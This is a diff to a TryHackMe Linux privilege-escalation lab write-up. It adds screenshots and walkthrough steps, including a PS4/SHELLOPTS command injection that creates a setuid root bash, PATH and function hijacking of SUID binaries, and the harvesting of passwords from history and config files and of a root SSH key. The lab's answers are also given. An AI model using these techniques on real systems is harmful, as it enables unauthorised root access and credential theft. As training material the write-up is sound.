@@ -568,7 +568,10 @@ chmod +x cve-2016-1531.sh
 
 ### SUID / SGID Executables - Shared Object Injection
 
-
+![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Create_Object.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Root_Shell.png)
+![SUID So](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_SUID_SO.png)
+![Strace](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Shared_Object_Injection_Strace.png)
 
 *Read and follow along with the above.*
 
@@ -593,6 +596,11 @@ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc
 
 ### SUID / SGID Executables - Environment Variables
 
+![Create Object](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Create_Object.png)
+![Patch](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Path.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Root_Shell.png)
+![SUID Env](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_SUID_ENV.png)
+![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Environment_Variables_Strings.png)
 
 *Read and follow along with the above.*
 
@@ -618,6 +626,10 @@ PATH=.:$PATH /usr/local/bin/suid-env
 
 ### SUID / SGID Executables - Abusing Shell Features (#1)
 
+![Bash Version](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/ABusing_Shell_Features_1_Bash_Version.png)
+![Create Function](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Create_Function.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Root_Shell.png)
+![Strings](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_1_Strings.png)
 
 *Read and follow along with the above.*
 
@@ -644,6 +656,10 @@ export -f /usr/sbin/service
 
 ### SUID / SGID Executables - Abusing Shell Features (#2)
 
+![Bash Debugging](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Bash_Debugging.png)
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Abusing_Shell_Features_2_Root_Shell.png)
+
+
 ```cmd
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
@@ -656,8 +672,71 @@ exit
 ```
 
 ### Passwords & Keys - History Files
+
+![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_Contents.png)
+![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_File.png)
+![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_History_Root.png)
+
+
+1. What is the full mysql command the user executed?
+
+   ```cmd
+   cat ~/.*history | less
+   ```
+   ```cmd
+   su root
+   ```
+
+   ><details><summary>Click for answer</summary>mysql -h somehost.local -uroot -ppassword123</details>
+
 ### Passwords & Keys - Config Files
+
+![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Contents.png)
+![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Credentials.png)
+![File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_File.png)
+![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_Config_Root.png)
+
+
+1. What file did you find the root user's credentials in?   
+
+   ```cmd
+   ls -lh ~
+   ```
+   ```cmd
+   cat /home/user/myvpn.ovpn
+   ```
+   ```cmd
+   su root
+   ```
+
+   ><details><summary>Click for answer</summary>/etc/openvpn/auth.txt</details>
+
 ### Passwords & Keys - SSH Keys
+
+![Contents](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Contents.png)
+![Create Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Create_Key.png)
+![Folder](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Folder.png)
+![Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Key.png)
+![Permissions Change](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Permissions_Change.png)
+![Permissions Error](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Permissions_Error.png)
+![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Passwords_SSH_Root.png)
+```cmd
+ls -la /
+```
+```cmd
+ls -lh /.ssh
+```
+```cmd
+cat /.ssh/root_key
+```
+```cmd
+chmod 600 root_key 
+```
+```cmd
+ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.65.67
+```
+
+
 ### NFS
 ### Kernel Exploits
 ### Privilege Escalation Scripts 
